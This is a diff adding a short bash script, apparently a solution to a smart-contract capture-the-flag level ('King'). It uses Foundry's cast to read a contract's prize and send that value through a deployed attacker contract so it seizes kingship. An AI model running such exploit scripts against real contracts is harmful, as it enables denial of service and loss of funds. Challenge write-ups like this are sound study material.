@@ -1,0 +1,15 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+CON=0xA71F5aa734AE50D5fAA6056107Ffb96E8Deb6d9B
+VAL=$(cast call $CON 'prize()')
+VAL=$(cast --to-dec $VAL)
+
+
+# forge create --private-key "$KEY" '9.king.sol:King'
+KING=0xa2948f79b75db69ca0e84e8013aacfa15885b45e
+
+
+cast send --private-key $KEY --value $VAL $KING 'take(address)' $CON
